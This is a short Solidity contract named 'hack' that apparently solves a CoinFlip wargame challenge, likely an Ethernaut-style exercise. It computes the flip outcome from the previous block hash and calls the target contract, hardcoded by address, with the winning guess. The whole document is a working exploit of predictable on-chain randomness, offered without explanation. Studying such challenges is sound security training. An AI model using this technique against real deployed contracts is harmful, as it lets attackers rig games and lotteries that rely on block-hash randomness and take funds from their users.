
pragma solidity ^0.8.0;

interface ICoinFlip{ 
function flip(bool _guess) external returns (bool);
}
contract hack{

uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
ICoinFlip public obj;

constructor() {
    obj = ICoinFlip(0xD991431D8b033ddCb84dAD257f4821E9d5b38C33);
}
function attack() public{
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = uint256(blockValue/FACTOR);
    bool side = coinFlip == 1 ? true : false;
    obj.flip(side);
}
}
